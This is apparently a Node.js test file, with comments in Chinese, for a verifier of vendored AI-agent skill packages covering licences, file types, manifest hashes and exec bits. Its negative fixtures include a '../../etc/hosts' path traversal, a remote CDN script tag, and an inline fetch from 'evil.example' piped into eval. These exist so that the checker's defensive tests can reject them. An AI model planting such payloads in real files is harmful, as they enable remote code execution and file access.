/**
 * test-verify-external-skills.mjs — verify-external-skills.mjs 多 vendor profile 纯夹具测试。
 *
 * 权威依据（只读引用，不修改它们）：
 *   - docs/external-skills.md  §4 manifest 契约 / §5 八条红线
 *   - docs/testing/external-skills-acceptance.md  域 A/B/C/F/H（QA 独占，本文件只读引用其口径）
 *
 * 本文件做什么（纯 Node 内置、只读、离线、确定性、幂等）：
 *   - 断言 mattpocock 既有 strict profile 未被放宽（MIT / LICENSE / 固定 4 entry / 仅 md/yaml）；
 *   - 断言 oil-oil 显式注册 profile（Apache-2.0 / LICENSE.txt / 单 entry / 仅锁 manifest 指定的 json/html）；
 *   - 负例：license spdx 错误、license.file 错误、路径穿越、entry 注入、html 远程脚本、
 *     html 可执行网络 API、缺失文件、可执行位、未注册 vendor 目录，全部必须 FAIL；
 *   - 只读复核真实落盘的 mattpocock 与 oil-oil 均 PASS（只读，不写不改）。
 *
 * 本文件绝不做什么：
 *   - 不联网、不执行/import/eval 任何 vendored 内容；不修改 vendor/docs/产品代码；
 *   - 不替代独立测试门：本测试是导入/开发侧自测，PASS 结论归独立测试专家。
 *
 * 用法：node scripts/test-verify-external-skills.mjs   全部通过退出 0，任一失败退出 1。
 * （文件名 test- 开头，不被 verify-isolation guard 的 verify-*.mjs 自动发现递归跑。）
 */
import assert from 'node:assert/strict'
import { fileURLToPath } from 'node:url'
import { dirname, join } from 'node:path'
import { mkdtempSync, mkdirSync, writeFileSync, chmodSync, existsSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { createHash } from 'node:crypto'
import {
  checkVendorRoot,
  VENDOR_PROFILES,
  scanVendorRoots,
} from './verify-external-skills.mjs'

const here = dirname(fileURLToPath(import.meta.url))
const REPO = join(here, '..', '..', '..')
const AGENT_SKILLS_DIR = join(REPO, 'vendor', 'agent-skills')

const sha256Of = (buf) => createHash('sha256').update(buf).digest('hex')

function buildFixtureDir() {
  return mkdtempSync(join(tmpdir(), 'verify-external-skills-test-'))
}

function writeTree(dir, relToContent) {
  for (const [rel, content] of Object.entries(relToContent)) {
    const abs = join(dir, rel)
    mkdirSync(dirname(abs), { recursive: true })
    const buf = typeof content === 'string' ? Buffer.from(content, 'utf8') : content
    writeFileSync(abs, buf)
  }
}

/** 由文件内容反推指纹，按给定 profile 生成合法 manifest。 */
function makeManifest({ files, entries, deps = [], profile, extra = {} }) {
  const byRel = {}
  for (const [rel, content] of Object.entries(files)) {
    const buf = typeof content === 'string' ? Buffer.from(content, 'utf8') : content
    byRel[rel] = { sha256: sha256Of(buf), bytes: buf.length }
  }
  const skills = entries.map((id) => ({
    id, kind: 'entry', reviewStatus: 'imported-self-audited', name: id,
    upstreamPath: `skills/${id}`,
    files: Object.entries(byRel).filter(([r]) => r.startsWith(`skills/${id}/`))
      .map(([path, h]) => ({ path, sha256: h.sha256, bytes: h.bytes })),
  }))
  for (const dep of deps) {
    skills.push({
      id: dep.id, kind: 'dependency', reviewStatus: 'reviewed', name: dep.id,
      upstreamPath: `skills/${dep.id}`, exposed: false,
      files: Object.entries(byRel).filter(([r]) => r.startsWith(`skills/${dep.id}/`))
        .map(([path, h]) => ({ path, sha256: h.sha256, bytes: h.bytes })),
    })
  }
  const rootFiles = Object.entries(byRel).filter(([r]) => !r.startsWith('skills/'))
    .map(([path, h]) => ({ path, sha256: h.sha256, bytes: h.bytes }))
  return {
    schemaVersion: 3,
    source: { repo: 'https://example.com/vendor-skills', commit: 'a'.repeat(40), fetchedAtUtc: '2026-01-01T00:00:00Z' },
    entrySkillIds: entries,
    declaredDependencies: deps.map((d) => ({
      entrySkillId: d.of, dependencySkillId: d.id, exposed: false, pureDocumentation: true, reason: 'fixture dep',
    })),
    license: { spdx: profile.licenseSpdx, file: profile.licenseFile },
    policy: { projectRulesPrecedence: true, noInstallerRun: true, noHomeOrGlobalWrites: true },
    projectRulesPriority: { statement: 'project rules win', conflictResolution: 'project wins' },
    skills, rootFiles, excludedArtifacts: [], riskList: [],
    integrity: { vendoredFileCount: Object.keys(byRel).length },
    ...extra,
  }
}

const SKILL_MD = (id) => `---\nname: ${id}\ndescription: fixture ${id}\n---\n\nDo the ${id} thing.\n`

let checked = 0
function check(name, fn) {
  fn()
  checked++
  console.log(`  ✓ ${name}`)
}

// ---------------------------------------------------------------------------
// 0. profile 注册表：mattpocock strict 不变，oil-oil 显式注册
// ---------------------------------------------------------------------------
console.log('【0】profile 注册表（mattpocock strict 不放宽 / oil-oil 显式注册）')

check('mattpocock profile 保持 MIT + LICENSE + 固定 4 entry + 仅 md/yaml', () => {
  const p = VENDOR_PROFILES['mattpocock']
  assert.ok(p)
  assert.equal(p.licenseSpdx, 'MIT')
  assert.equal(p.licenseFile, 'LICENSE')
  assert.deepEqual(p.expectedEntryIds, ['grill-me', 'tdd', 'code-review', 'diagnosing-bugs'])
  assert.equal(p.allowHtml, false)
  assert.equal(p.allowJson, false)
  for (const ext of ['.md', '.yaml', '.yml']) assert.ok(p.allowedExt.has(ext), ext)
  for (const ext of ['.json', '.html', '.sh', '.js', '.py']) assert.ok(!p.allowedExt.has(ext), ext)
})

check('oil-oil profile 显式 Apache-2.0 + LICENSE.txt + 单 entry + 仅 json/html', () => {
  const p = VENDOR_PROFILES['oil-oil']
  assert.ok(p)
  assert.equal(p.licenseSpdx, 'Apache-2.0')
  assert.equal(p.licenseFile, 'LICENSE.txt')
  assert.deepEqual(p.expectedEntryIds, ['oiloil-ui-ux-guide'])
  assert.equal(p.allowHtml, true)
  assert.equal(p.allowJson, true)
  assert.ok(p.allowedExt.has('.md'))
  assert.ok(p.allowedExt.has('.json'))
  assert.ok(p.allowedExt.has('.html'))
  for (const ext of ['.sh', '.js', '.mjs', '.py', '.ts', '.yaml']) assert.ok(!p.allowedExt.has(ext), ext)
  assert.ok(p.allowedRootBase.has('LICENSE.txt'))
})

check('profile 注册表不全局放行任意 license / 脚本类型', () => {
  for (const [name, p] of Object.entries(VENDOR_PROFILES)) {
    assert.ok(['MIT', 'Apache-2.0'].includes(p.licenseSpdx), `${name} spdx=${p.licenseSpdx}`)
    for (const ext of ['.sh', '.js', '.mjs', '.py', '.ts', '.bin', '.exe']) {
      assert.ok(!p.allowedExt.has(ext), `${name} 不应放行 ${ext}`)
    }
  }
})

// ---------------------------------------------------------------------------
// 1. oil 合法夹具 PASS（Apache-2.0 / LICENSE.txt / md+json+静态 html）
// ---------------------------------------------------------------------------
console.log('【1】oil 合法夹具通过')

const OIL_FILES = {
  'LICENSE.txt': 'Apache License Version 2.0 fixture\n',
  'skills/oiloil-ui-ux-guide/SKILL.md': SKILL_MD('oiloil-ui-ux-guide'),
  'skills/oiloil-ui-ux-guide/evals/evals.json': JSON.stringify({ cases: [] }),
  'skills/oiloil-ui-ux-guide/references/preview.html':
    '<!doctype html><html><head><title>t</title>' +
    '<link rel="preconnect" href="https://fonts.googleapis.com"></head>' +
    '<body><p>static</p><script src="design-config.js"></script></body></html>',
}

check('oil 合法夹具（静态 html + 声明的本地 design-config.js）PASS', () => {
  const dir = buildFixtureDir()
  writeTree(dir, OIL_FILES)
  const man = makeManifest({ files: OIL_FILES, entries: ['oiloil-ui-ux-guide'], profile: VENDOR_PROFILES['oil-oil'],
    extra: { excludedArtifacts: ['design-config.js — agent-generated local preview config, never vendored'] } })
  writeTree(dir, { 'manifest.json': JSON.stringify(man, null, 2) })
  const r = checkVendorRoot(dir, VENDOR_PROFILES['oil-oil'])
  assert.ok(r.ok, r.errors.join(' | '))
  assert.equal(r.fileCount, 4)
  assert.equal(r.entryCount, 1)
})

// ---------------------------------------------------------------------------
// 2. 负例：license 错误
// ---------------------------------------------------------------------------
console.log('【2】负例：license')

check('oil profile 下 spdx 误用 MIT → LICENSE_SPDX 拒', () => {
  const dir = buildFixtureDir()
  writeTree(dir, OIL_FILES)
  const man = makeManifest({ files: OIL_FILES, entries: ['oiloil-ui-ux-guide'], profile: VENDOR_PROFILES['oil-oil'] })
  man.license.spdx = 'MIT'
  writeTree(dir, { 'manifest.json': JSON.stringify(man, null, 2) })
  const r = checkVendorRoot(dir, VENDOR_PROFILES['oil-oil'])
  assert.ok(!r.ok)
  assert.ok(r.errors.some((e) => e.includes('LICENSE_SPDX')), r.errors.join(' | '))
})

check('oil profile 下 license.file 误用 LICENSE → LICENSE_FILE 拒', () => {
  const dir = buildFixtureDir()
  writeTree(dir, OIL_FILES)
  const man = makeManifest({ files: OIL_FILES, entries: ['oiloil-ui-ux-guide'], profile: VENDOR_PROFILES['oil-oil'] })
  man.license.file = 'LICENSE'
  writeTree(dir, { 'manifest.json': JSON.stringify(man, null, 2) })
  const r = checkVendorRoot(dir, VENDOR_PROFILES['oil-oil'])
  assert.ok(!r.ok)
  assert.ok(r.errors.some((e) => e.includes('LICENSE_FILE')), r.errors.join(' | '))
})

check('mattpocock profile 下 Apache-2.0 → LICENSE_SPDX 拒（不得反向放宽）', () => {
  const dir = buildFixtureDir()
  const files = {
    'LICENSE': 'MIT License fixture\n',
    'skills/a/SKILL.md': SKILL_MD('a'), 'skills/b/SKILL.md': SKILL_MD('b'),
    'skills/c/SKILL.md': SKILL_MD('c'), 'skills/d/SKILL.md': SKILL_MD('d'),
  }
  writeTree(dir, files)
  const man = makeManifest({ files, entries: ['a', 'b', 'c', 'd'], profile: VENDOR_PROFILES['mattpocock'] })
  man.license.spdx = 'Apache-2.0'
  writeTree(dir, { 'manifest.json': JSON.stringify(man, null, 2) })
  const r = checkVendorRoot(dir, VENDOR_PROFILES['mattpocock'])
  assert.ok(!r.ok)
  assert.ok(r.errors.some((e) => e.includes('LICENSE_SPDX')), r.errors.join(' | '))
})

// ---------------------------------------------------------------------------
// 3. 负例：路径穿越 / entry 注入 / 缺失 / 可执行位
// ---------------------------------------------------------------------------
console.log('【3】负例：路径穿越、entry 注入、缺失、exec 位')

check('manifest 声明路径含 .. 穿越 → PATH_TRAVERSAL 拒', () => {
  const dir = buildFixtureDir()
  writeTree(dir, OIL_FILES)
  const man = makeManifest({ files: OIL_FILES, entries: ['oiloil-ui-ux-guide'], profile: VENDOR_PROFILES['oil-oil'] })
  man.rootFiles.push({ path: '../../etc/hosts', sha256: '0'.repeat(64), bytes: 11 })
  writeTree(dir, { 'manifest.json': JSON.stringify(man, null, 2) })
  const r = checkVendorRoot(dir, VENDOR_PROFILES['oil-oil'])
  assert.ok(!r.ok)
  assert.ok(r.errors.some((e) => e.includes('PATH_TRAVERSAL')), r.errors.join(' | '))
})

check('oil profile entry 注入（多出未注册 id）→ ENTRY_SET 拒', () => {
  const dir = buildFixtureDir()
  writeTree(dir, OIL_FILES)
  const man = makeManifest({ files: OIL_FILES, entries: ['oiloil-ui-ux-guide'], profile: VENDOR_PROFILES['oil-oil'] })
  man.entrySkillIds = ['oiloil-ui-ux-guide', 'injected-skill']
  writeTree(dir, { 'manifest.json': JSON.stringify(man, null, 2) })
  const r = checkVendorRoot(dir, VENDOR_PROFILES['oil-oil'])
  assert.ok(!r.ok)
  assert.ok(r.errors.some((e) => e.includes('ENTRY_SET') || e.includes('ENTRY_UNDECLARED')), r.errors.join(' | '))
})

check('manifest 声明但磁盘缺失 → MISSING_FILE 拒', () => {
  const dir = buildFixtureDir()
  const files = {
    'LICENSE.txt': 'Apache License Version 2.0 fixture\n',
    'skills/oiloil-ui-ux-guide/SKILL.md': SKILL_MD('oiloil-ui-ux-guide'),
  }
  writeTree(dir, files)
  const man = makeManifest({ files, entries: ['oiloil-ui-ux-guide'], profile: VENDOR_PROFILES['oil-oil'] })
  // 追加一个声明但不落盘的文件
  man.skills[0].files.push({ path: 'skills/oiloil-ui-ux-guide/evals/evals.json', sha256: '0'.repeat(64), bytes: 2 })
  writeTree(dir, { 'manifest.json': JSON.stringify(man, null, 2) })
  const r = checkVendorRoot(dir, VENDOR_PROFILES['oil-oil'])
  assert.ok(!r.ok)
  assert.ok(r.errors.some((e) => e.includes('MISSING_FILE')), r.errors.join(' | '))
})

check('文件带可执行位 → EXEC_BIT 拒', () => {
  const dir = buildFixtureDir()
  writeTree(dir, OIL_FILES)
  chmodSync(join(dir, 'skills/oiloil-ui-ux-guide/SKILL.md'), 0o755)
  const man = makeManifest({ files: OIL_FILES, entries: ['oiloil-ui-ux-guide'], profile: VENDOR_PROFILES['oil-oil'] })
  writeTree(dir, { 'manifest.json': JSON.stringify(man, null, 2) })
  const r = checkVendorRoot(dir, VENDOR_PROFILES['oil-oil'])
  assert.ok(!r.ok)
  assert.ok(r.errors.some((e) => e.includes('EXEC_BIT')), r.errors.join(' | '))
})

// ---------------------------------------------------------------------------
// 4. 负例：html 远程脚本 / 可执行网络 API
// ---------------------------------------------------------------------------
console.log('【4】负例：html 静态门')

check('html 远程 <script src=https> → HTML_REMOTE_SCRIPT 拒', () => {
  const dir = buildFixtureDir()
  const files = { ...OIL_FILES,
    'skills/oiloil-ui-ux-guide/references/preview.html':
      '<!doctype html><html><body><script src="https://cdn.example.com/x.js"></script></body></html>' }
  writeTree(dir, files)
  const man = makeManifest({ files, entries: ['oiloil-ui-ux-guide'], profile: VENDOR_PROFILES['oil-oil'] })
  writeTree(dir, { 'manifest.json': JSON.stringify(man, null, 2) })
  const r = checkVendorRoot(dir, VENDOR_PROFILES['oil-oil'])
  assert.ok(!r.ok)
  assert.ok(r.errors.some((e) => e.includes('HTML_REMOTE_SCRIPT')), r.errors.join(' | '))
})

check('html 内联 fetch()/eval() 可执行载荷 → HTML_EXEC 拒', () => {
  const dir = buildFixtureDir()
  const files = { ...OIL_FILES,
    'skills/oiloil-ui-ux-guide/references/preview.html':
      '<!doctype html><html><body><script>fetch("https://evil.example/collect").then(eval)</script></body></html>' }
  writeTree(dir, files)
  const man = makeManifest({ files, entries: ['oiloil-ui-ux-guide'], profile: VENDOR_PROFILES['oil-oil'] })
  writeTree(dir, { 'manifest.json': JSON.stringify(man, null, 2) })
  const r = checkVendorRoot(dir, VENDOR_PROFILES['oil-oil'])
  assert.ok(!r.ok)
  assert.ok(r.errors.some((e) => e.includes('HTML_EXEC')), r.errors.join(' | '))
})

check('mattpocock profile 出现 .html → FORBIDDEN_FILE_TYPE 拒（不全局放行 html）', () => {
  const dir = buildFixtureDir()
  const files = {
    'LICENSE': 'MIT License fixture\n',
    'skills/a/SKILL.md': SKILL_MD('a'), 'skills/b/SKILL.md': SKILL_MD('b'),
    'skills/c/SKILL.md': SKILL_MD('c'), 'skills/d/SKILL.md': SKILL_MD('d'),
    'skills/a/preview.html': '<p>x</p>',
  }
  writeTree(dir, files)
  const man = makeManifest({ files, entries: ['a', 'b', 'c', 'd'], profile: VENDOR_PROFILES['mattpocock'] })
  writeTree(dir, { 'manifest.json': JSON.stringify(man, null, 2) })
  const r = checkVendorRoot(dir, VENDOR_PROFILES['mattpocock'])
  assert.ok(!r.ok)
  assert.ok(r.errors.some((e) => e.includes('FORBIDDEN_FILE_TYPE')), r.errors.join(' | '))
})

// ---------------------------------------------------------------------------
// 5. 多 vendor 扫描：未注册目录拒；注册目录缺失拒
// ---------------------------------------------------------------------------
console.log('【5】多 vendor 扫描')

check('未注册同级目录仅 SKIPPED_UNREGISTERED 留痕、不越权审计/不阻断', () => {
  const dir = buildFixtureDir()
  // 同时放一个完整合法的注册目录，避免 MISSING_VENDOR 干扰本断言
  mkdirSync(join(dir, 'mattpocock'), { recursive: true })
  writeTree(dir, { 'mattpocock/LICENSE': 'MIT License fixture\n' })
  writeTree(dir, { 'rogue-vendor/SKILL.md': '# rogue\n' })
  const r = scanVendorRoots(dir)
  assert.ok(r.notes.some((n) => n.includes('SKIPPED_UNREGISTERED') && n.includes('rogue-vendor')), r.notes.join(' | '))
  assert.ok(!r.errors.some((e) => e.includes('UNKNOWN_VENDOR')), r.errors.join(' | '))
})

check('注册 profile 目录缺失 → MISSING_VENDOR 阻断', () => {
  const dir = buildFixtureDir()
  const r = scanVendorRoots(dir)
  assert.ok(!r.ok)
  assert.ok(r.errors.some((e) => e.includes('MISSING_VENDOR')), r.errors.join(' | '))
})

// ---------------------------------------------------------------------------
// 6. 只读复核真实落盘（mattpocock + oil-oil 均应 PASS）
// ---------------------------------------------------------------------------
console.log('【6】真实落盘只读复核')

check('真实 mattpocock PASS（既有 strict 门未回归）', () => {
  const p = join(AGENT_SKILLS_DIR, 'mattpocock')
  assert.ok(existsSync(p))
  const r = checkVendorRoot(p, VENDOR_PROFILES['mattpocock'])
  assert.ok(r.ok, r.errors.join(' | '))
  assert.equal(r.entryCount, 4)
})

check('真实 oil-oil PASS（Apache-2.0 / LICENSE.txt / 23 文件指纹一致）', () => {
  const p = join(AGENT_SKILLS_DIR, 'oil-oil')
  assert.ok(existsSync(p))
  const r = checkVendorRoot(p, VENDOR_PROFILES['oil-oil'])
  assert.ok(r.ok, r.errors.join(' | '))
  assert.equal(r.entryCount, 1)
  assert.equal(r.fileCount, 23)
})

check('scanVendorRoots 真实目录全绿', () => {
  const r = scanVendorRoots(AGENT_SKILLS_DIR)
  assert.ok(r.ok, r.errors.join(' | '))
})

console.log(`\ntest-verify-external-skills 通过：共 ${checked} 组断言；mattpocock strict 未放宽，oil-oil 显式注册，全部负例被拒。`)
